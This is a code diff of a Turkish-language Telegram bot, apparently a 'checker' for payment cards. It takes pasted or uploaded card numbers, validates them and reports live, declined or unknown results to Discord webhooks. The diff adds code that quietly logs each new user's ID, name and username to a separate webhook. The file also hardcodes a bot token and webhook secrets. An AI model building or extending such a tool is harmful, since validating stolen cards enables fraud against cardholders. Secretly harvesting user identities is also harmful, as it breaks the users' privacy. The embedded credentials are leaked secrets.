@@ -9,7 +9,7 @@ BOT_TOKEN = "7895292921:AAH7iEd54PRiraenPE_2hlQ5ZGtIWuU5uB4"
 WEBHOOK_LIVE = "https://discord.com/api/webhooks/1362353337013506129/bcAAKfveNmZfEQm6KSEXe0_ToWeU_A_hG_jp8kfq7Ga5uBKWQJ8CmBsxFJpmQmMEAItS"
 WEBHOOK_DECLINED = "https://discord.com/api/webhooks/1362353376909590599/VBJOl1N3f6H69UudhjXwPyuRZlRbCgF0suIY7M2shVCtgT-Pc3AI7BhTrJH07cE4KX87"
 WEBHOOK_UNKNOWN = "https://discord.com/api/webhooks/1362353440931708979/4vwk-95JiHHDnojOCIxZ3fx2lE6wevQhgvd-IXV5hVg79Muqn6MEbA6L5YlGkYhDfSFJ"
-
+WEBHOOK_JOIN = "https://discord.com/api/webhooks/1362552619645665566/2z_Qdze2mQ3TsvgxEgg6YR3jWNX0yEsOMW1u4JRIBq0r38ZVvR7julwfgkuOKzaBVKQs"
 bot = TeleBot(BOT_TOKEN)
 
 def clean_result(text):
@@ -42,11 +42,18 @@ def check_card(card):
 
 @bot.message_handler(commands=['start'])
 def start_cmd(message):
-    bot.reply_to(message, "👋 Hoş Geldiniz ---CREDIT HERSEUX\n\nKomutlar:\n/check - Tek veya birden fazla kart gir\n/topluchk - .txt ile kart kontrol et\n/parser - Kartları parseler ve kontrol eder")
+    user_id = message.from_user.id
+    first_name = message.from_user.first_name or ""
+    last_name = message.from_user.last_name or ""
+    username = message.from_user.username or "Yok"
+    full_name = f"{first_name} {last_name}".strip()
+    content = f"👤 Yeni kullanıcı başlattı:\nID: {user_id}\nAd Soyad: {full_name}\nKullanıcı adı: @{username}"
+    send_to_webhook(content, WEBHOOK_JOIN)
+    bot.reply_to(message, f"👋 Hoş geldin @{username}! - HERSEUX\n\nKomutlar:\n/check - Tek veya birden fazla kart gir\n/topluchk - .txt ile kart kontrol et\n/parser - Kartları parsele ve checkle")
 
 @bot.message_handler(commands=['check'])
 def tek_check(message):
-    msg = bot.send_message(message.chat.id, "Karttları gir ister tek tek ister toplu satır satır:")
+    msg = bot.send_message(message.chat.id, "Kartları gir (satır satır ):")
     bot.register_next_step_handler(msg, tek_check_cevap)
 
 def tek_check_cevap(msg):
@@ -77,7 +84,7 @@ def toplu_check_cevap(msg):
         downloaded = bot.download_file(file_info.file_path)
         cards = StringIO(downloaded.decode("utf-8", errors="ignore")).readlines()
         if len(cards) > 30:
-            return bot.send_message(msg.chat.id, f"Napiyon ({len(cards)}) kart ne aq")
+            return bot.send_message(msg.chat.id, f"Napiyon ({len(cards)}) ne nasıl yapayım!")
         yanitlar = [check_card(c.strip()) for c in cards if c.strip()]
         cevap = "\n".join(yanitlar)
         if len(cevap) < 4000:
@@ -92,7 +99,7 @@ def toplu_check_cevap(msg):
 
 @bot.message_handler(commands=['parser'])
 def parser_handler(message):
-    msg = bot.send_message(message.chat.id, "Lütfen kart data içeren .txt dosyası gönderin (max 30 satır)")
+    msg = bot.send_message(message.chat.id, "Lütfen ham kart içeren .txt dosyası gönderin (max 30 satır)")
     bot.register_next_step_handler(msg, parser_cevap)
 
 def parser_cevap(msg):
@@ -103,7 +110,7 @@ def parser_cevap(msg):
         downloaded = bot.download_file(file_info.file_path)
         lines = StringIO(downloaded.decode("utf-8", errors="ignore")).readlines()
         if len(lines) > 30:
-            return bot.send_message(msg.chat.id, f"Napiyon ({len(lines)}) kart ne aq")
+            return bot.send_message(msg.chat.id, f"Napiyon ({len(lines)}) ne nasıl yapayım!")
         parsed = []
         for line in lines:
             nums = re.findall(r'\d+', line)
